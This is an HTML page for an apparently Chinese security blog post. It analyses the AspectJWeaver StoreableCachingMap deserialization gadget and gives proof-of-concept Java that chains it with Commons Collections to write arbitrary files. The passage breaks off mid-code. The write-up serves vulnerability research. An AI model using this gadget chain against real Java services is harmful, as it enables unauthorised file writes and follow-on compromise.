@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+  <head><meta name="referrer" content="no-referrer"/><meta name="generator" content="Hexo 6.3.0"></head>
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      AspectJWeaver写文件及后续利用 
+      
+      
+      |
+    
+     Prove yourself
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/myblog.ico">
+    <link rel="icon" href="/images/myblog.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/me.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Aecous</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">AspectJWeaver写文件及后续利用</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-09-30 13:48:26
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11499">https://xz.aliyun.com/t/11499</a><br><a target="_blank" rel="noopener" href="https://www.ctfiot.com/43232.html">https://www.ctfiot.com/43232.html</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/misery333/sz1apr/bkcygs4ecn8e7t6d">AspectJWeaver利用链，以及rt.jar覆盖 (yuque.com)</a></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>实际上很久之前就知道这条链子了，但是我一直没有写相关的记录，刚刚发现了一个非常有意思的东西，所以就抄抄m1师傅的博客，顺便再加点自己的东西</p>
+<p>丢个依赖</p>
+<pre class="line-numbers language-none"><code class="language-none">   &lt;dependency&gt;
+       &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt;
+       &lt;artifactId&gt;aspectjweaver&lt;&#x2F;artifactId&gt;
+       &lt;version&gt;1.9.2&lt;&#x2F;version&gt;
+   &lt;&#x2F;dependency&gt;
+
+&lt;dependency&gt;  
+   &lt;groupId&gt;commons-collections&lt;&#x2F;groupId&gt;  
+   &lt;artifactId&gt;commons-collections&lt;&#x2F;artifactId&gt;  
+   &lt;version&gt;3.2.1&lt;&#x2F;version&gt;  
+&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>该利用链需要配合cc或者其他依赖进行使用</p>
+<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap是一个内部类，其put方法如下</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span>  
+<span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Object</span> key<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>  
+      <span class="token class-name">String</span> path <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  
+      <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> valueBytes <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> value<span class="token punctuation">;</span>  
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>valueBytes<span class="token punctuation">,</span> <span class="token constant">SAME_BYTES</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+         path <span class="token operator">=</span> <span class="token constant">SAME_BYTES_STRING</span><span class="token punctuation">;</span>  
+      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  
+         path <span class="token operator">=</span> <span class="token function">writeToPath</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> key<span class="token punctuation">,</span> valueBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+      <span class="token punctuation">&#125;</span>  
+      <span class="token class-name">Object</span> result <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+      <span class="token function">storeMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+      <span class="token keyword">return</span> result<span class="token punctuation">;</span>  
+   <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+      trace<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Error inserting in cache: key:"</span><span class="token operator">+</span>key<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"; value:"</span><span class="token operator">+</span>value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+      <span class="token class-name">Dump</span><span class="token punctuation">.</span><span class="token function">dumpWithException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+   <span class="token punctuation">&#125;</span>  
+   <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>写文件利用点位writeToPath函数，跟进查看</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">writeToPath</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>  
+   <span class="token class-name">String</span> fullPath <span class="token operator">=</span> folder <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> key<span class="token punctuation">;</span>  
+   <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>fullPath<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+   fos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+   fos<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+   fos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+   <span class="token keyword">return</span> fullPath<span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以发现将key拼接入了fullpath中，使用FileOutputStream新建了该文件，并将bytes写入其中，这就是我们最终利用的点。</p>
+<h3 id="利用链示例编写"><a href="#利用链示例编写" class="headerlink" title="利用链示例编写"></a>利用链示例编写</h3><p>观察其构造方法，接受参数folder 与 storingTimer<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052677313-8207af51-6d3d-4e37-acc5-546f77b72118.png#averageHue=%232e2d2c&clientId=uf8a3a4cf-9631-4&from=drop&id=ua899206a&originHeight=183&originWidth=632&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22483&status=done&style=none&taskId=u96fd37e4-7e94-4f07-8ef0-7b9992f1b0f&title=" alt="Pasted image 20230930111240.png"><br>在写入文件时会拼接folder参数，所以应指定为写入的目录，而storingTimer是一个判断缓存的时间，后面会说<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052684704-5413d2e0-8ba5-4af1-b456-fc5b9b3737f5.png#averageHue=%232d2c2c&clientId=uf8a3a4cf-9631-4&from=drop&id=u8f45f897&originHeight=223&originWidth=720&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26741&status=done&style=none&taskId=ue97bd8e9-e717-4731-a94b-282177f4d65&title=" alt="Pasted image 20230930111333.png"><br>因SimpleCache$StoreableCachingMap是个内部private类，所以用反射实例化</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span></span><span class="token class-name">StandardCharsets</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">public</span> <span class="token keyword">class</span> new_hashcode <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
+  
+        <span class="token comment">//反射获取构造函数并实例化  </span>
+        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> aClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token comment">//该类继承了hashmap，所以通过将其转化为hashmap类，并调用其put方法  </span>
+        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HashMap</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"D:/tmp"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">,</span><span class="token string">"this is a test"</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052691886-db1963fe-259a-4722-95e0-007350158353.png#averageHue=%23454544&clientId=uf8a3a4cf-9631-4&from=drop&id=u05db4ee8&originHeight=395&originWidth=1114&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69922&status=done&style=none&taskId=u69db47fe-206c-42cb-9a91-ab16736f3aa&title=" alt="Pasted image 20230930111941.png"></p>
+<p>结合CC链进行编写</p>
+<pre class="line-numbers language-none"><code class="language-none">BadAttributeValueExpException.readObject
+	TiedMapEntry.toString ----&gt; getValue
+		LazyMap.get
+			StoreableCachingMap.put<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">sec<span class="token punctuation">.</span>unserialize<span class="token punctuation">.</span>aspectjweaver</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">sec<span class="token punctuation">.</span>tools</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span></span><span class="token class-name">StandardCharsets</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC_write</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
+        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> aClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HashMap</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"D:/tmp"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  
+        <span class="token class-name">ConstantTransformer</span> constantTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token string">"This is test"</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">Map</span> lazymap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> constantTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazymap<span class="token punctuation">,</span> <span class="token string">"1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        tools<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span><span class="token string">"val"</span><span class="token punctuation">,</span>tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  
+        <span class="token class-name">String</span> serialize <span class="token operator">=</span> tools<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        tools<span class="token punctuation">.</span><span class="token function">unserialize</span><span class="token punctuation">(</span>serialize<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="正向反序列化"><a href="#正向反序列化" class="headerlink" title="正向反序列化"></a>正向反序列化</h3><p>在put函数写入文件后，还有一个函数storeMap<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052703640-0cba4a1b-b088-4ed8-92b6-046f47074e37.png#averageHue=%232d2c2b&clientId=uf8a3a4cf-9631-4&from=drop&id=u97ff8f1f&originHeight=457&originWidth=720&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59259&status=done&style=none&taskId=uf9cf63a8-e592-4ba8-adcc-5b65d78d872&title=" alt="Pasted image 20230930115006.png"><br>其内容为</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">storeMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+   <span class="token keyword">long</span> now <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>now <span class="token operator">-</span> lastStored <span class="token punctuation">)</span> <span class="token operator">&lt;</span> storingTimer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+      <span class="token keyword">return</span><span class="token punctuation">;</span>  
+   <span class="token punctuation">&#125;</span>  
+   <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>folder <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> <span class="token constant">CACHENAMEIDX</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span>  
+   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>  
+      <span class="token class-name">ObjectOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>  
+            <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+      <span class="token comment">// Deserialize the object  </span>
+      out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+      out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+      lastStored <span class="token operator">=</span> now<span class="token punctuation">;</span>  
+   <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+      trace<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Error storing cache; cache file:"</span><span class="token operator">+</span>file<span class="token punctuation">.</span><span class="token function">getAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+      <span class="token class-name">Dump</span><span class="token punctuation">.</span><span class="token function">dumpWithException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+   <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看见在storingTimer就在此出现，storingTimer是缓存时间，如果过期就会将对象进行序列化，写入名为cache.idx的文件中<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052710739-36a7a4f3-d421-4f38-8c81-ae4096129786.png#averageHue=%232f2d2b&clientId=uf8a3a4cf-9631-4&from=drop&id=ud0c54253&originHeight=118&originWidth=602&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15930&status=done&style=none&taskId=u02efbd41-620a-4718-a22e-f869afa968d&title=" alt="Pasted image 20230930115255.png"><br>当我们将storingTimer设置的很小，例如0时，就会将序列化数据写入folder目录中的cache.idx<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052714505-372c3b6f-69b6-46a9-b563-ab77a7d54ab2.png#averageHue=%23737372&clientId=uf8a3a4cf-9631-4&from=drop&id=ue34d6f3d&originHeight=376&originWidth=891&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46119&status=done&style=none&taskId=u77a09288-5cc8-4e1e-a33e-acc51ec2e42&title=" alt="Pasted image 20230930120909.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052716226-eb7901e3-35c9-41fa-94b0-14412e4ed800.png#averageHue=%23393730&clientId=uf8a3a4cf-9631-4&from=drop&id=uc956991d&originHeight=526&originWidth=916&originalType=binary&ratio=1&rotation=0&showTitle=false&size=92641&status=done&style=none&taskId=uf968c22b-4a1c-4028-bf61-1c3f537b347&title=" alt="Pasted image 20230930120855.png"><br>那么既然有序列化，就有反序列化，我们可以找到StoreableCachingMap$init函数</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">StoreableCachingMap</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">String</span> folder<span class="token punctuation">,</span> <span class="token keyword">int</span> storingTimer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+   <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>folder <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> <span class="token constant">CACHENAMEIDX</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+   <span class="token keyword">if</span> <span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>  
+         <span class="token class-name">ObjectInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>  
+               <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+         <span class="token comment">// Deserialize the object  </span>
+         <span class="token class-name">StoreableCachingMap</span> sm <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StoreableCachingMap</span><span class="token punctuation">)</span> in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+         sm<span class="token punctuation">.</span><span class="token function">initTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+         in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+         <span class="token keyword">return</span> sm<span class="token punctuation">;</span>  
+      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+         <span class="token class-name">Trace</span> trace <span class="token operator">=</span> <span class="token class-name">TraceFactory</span><span class="token punctuation">.</span><span class="token function">getTraceFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token class-name">StoreableCachingMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
